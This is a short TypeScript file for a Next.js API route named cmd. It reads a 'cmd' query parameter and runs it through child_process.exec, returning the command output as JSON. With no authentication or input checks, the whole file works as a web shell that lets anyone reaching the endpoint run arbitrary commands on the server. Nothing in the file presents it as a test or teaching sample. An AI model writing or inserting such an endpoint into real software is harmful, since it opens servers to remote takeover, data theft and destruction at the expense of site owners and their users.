// pages/api/cmd.ts
import type { NextApiRequest, NextApiResponse } from 'next';
import { exec } from 'child_process';

export default function handler(req: NextApiRequest, res: NextApiResponse) {
  const { cmd } = req.query;
  
  if (!cmd || typeof cmd !== 'string') {
    return res.status(400).json({ error: 'No command provided' });
  }

  exec(cmd, (error, stdout, stderr) => {
    if (error) {
      return res.status(500).json({ error: error.message });
    }
    if (stderr) {
      return res.status(400).json({ error: stderr });
    }
    res.status(200).json({ output: stdout });
  });
}